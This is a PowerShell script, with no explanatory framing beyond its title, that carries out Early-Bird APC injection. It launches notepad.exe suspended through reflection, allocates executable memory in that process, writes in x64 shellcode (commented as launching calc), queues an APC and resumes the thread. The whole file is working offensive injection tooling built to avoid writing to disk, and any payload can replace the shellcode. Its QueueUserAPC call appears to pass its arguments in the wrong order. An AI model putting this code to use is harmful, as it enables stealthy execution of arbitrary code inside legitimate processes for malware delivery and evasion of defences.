
# Early-Bird Injection via PowerShell using reflection to call CreateProcess with CREATE_SUSPENDED flag

#shellcode to be injected - currently pop calc
$shellcode = [Byte[]] (0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,0x60,0x48,0x8b,0x5b,0x18,0x48,0x8b,0x5b,0x20,0x48,0x8b,0x1b,0x48,0x8b,0x1b,0x48,0x8b,0x5b,0x20,0x49,0x89,0xd8,0x8b,0x5b,0x3c,0x4c,0x01,0xc3,0x48,0x31,0xc9,0x66,0x81,0xc1,0xff,0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,0xc2,0x4d,0x31,0xd2,0x44,0x8b,0x52,0x1c,0x4d,0x01,0xc2,0x4d,0x31,0xdb,0x44,0x8b,0x5a,0x20,0x4d,0x01,0xc3,0x4d,0x31,0xe4,0x44,0x8b,0x62,0x24,0x4d,0x01,0xc4,0xeb,0x32,0x5b,0x59,0x48,0x31,0xc0,0x48,0x89,0xe2,0x51,0x48,0x8b,0x0c,0x24,0x48,0x31,0xff,0x41,0x8b,0x3c,0x83,0x4c,0x01,0xc7,0x48,0x89,0xd6,0xf3,0xa6,0x74,0x05,0x48,0xff,0xc0,0xeb,0xe6,0x59,0x66,0x41,0x8b,0x04,0x44,0x41,0x8b,0x04,0x82,0x4c,0x01,0xc0,0x53,0xc3,0x48,0x31,0xc9,0x80,0xc1,0x07,0x48,0xb8,0x0f,0xa8,0x96,0x91,0xba,0x87,0x9a,0x9c,0x48,0xf7,0xd0,0x48,0xc1,0xe8,0x08,0x50,0x51,0xe8,0xb0,0xff,0xff,0xff,0x49,0x89,0xc6,0x48,0x31,0xc9,0x48,0xf7,0xe1,0x50,0x48,0xb8,0x9c,0x9e,0x93,0x9c,0xd1,0x9a,0x87,0x9a,0x48,0xf7,0xd0,0x50,0x48,0x89,0xe1,0x48,0xff,0xc2,0x48,0x83,0xec,0x20,0x41,0xff,0xd6)

#use unsafe native methods to lookup function addresses

function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}} 
    $handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName));
    [IntPtr] $result = 0;
    try {
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }catch {
        $handle = new-object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @($null, $handle);
        $result = $tmp[0].Invoke($null, @($handle, $functionName));
    }
    return $result;
}

function getDelegateType {
    Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType() 
}

function CreateSuspendedProcess([string]$applicationPath)
{
    #we can use native methods to call CreateProcess with CREATE_SUSPENDED flag
    # Define necessary types and methods via reflection
    filter Get-Type ([string]$dllName,[string]$typeName)
    {
        if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) )
        {
            $_.GetType($typeName)
        }
    }

    # Obtain the required types via reflection
    $assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
    $nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
    $startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
    $processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'
    $startupInformation = $startupInformationType.GetConstructors().Invoke($null)
    $processInformation = $processInformationType.GetConstructors().Invoke($null)
    $CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")
    $cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\notepad.exe")
    $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))
    return $processInformation
}

#create suspended process
$procInfo = CreateSuspendedProcess "C:\\Windows\\System32\\notepad.exe"
$hProcess = $procInfo.hProcess

#allocate memory in target process
$addr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx),(getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
if ($addr -eq [IntPtr]::Zero) {
    Write-Host "Virtual alloc Failed"
    }
else {
    Write-Host "Allocated memory at address: $addr"
}

#write shellcode to allocated memory
$result = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory),(getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])([Bool]))).Invoke($hProcess, $addr, $shellcode, $shellcode.Length, [IntPtr]::Zero)
if ($result -eq $false) {
    Write-Host "Write process memory Failed"
    }
else {
    Write-Host "Wrote shellcode to target process"
}   

#queue APC on main thread to execute shellcode
$hthread = $procInfo.hThread
$result = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll QueueUserAPC),(getDelegateType @([IntPtr], [IntPtr], [UInt32])([UInt32]))).Invoke($addr, $hThread, 0)
if ($result -eq 0) {
    Write-Host "Queue APC Failed"
}
else {
    Write-Host "Queued APC to thread"
}

#resume main thread to trigger APC execution
$result = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll ResumeThread),(getDelegateType @([IntPtr])([IntPtr]))).Invoke($hThread)
if ($result -eq [IntPtr]::Zero) {
    Write-Host "Resume Thread Failed"
}
else {
    Write-Host "Resumed thread"
}
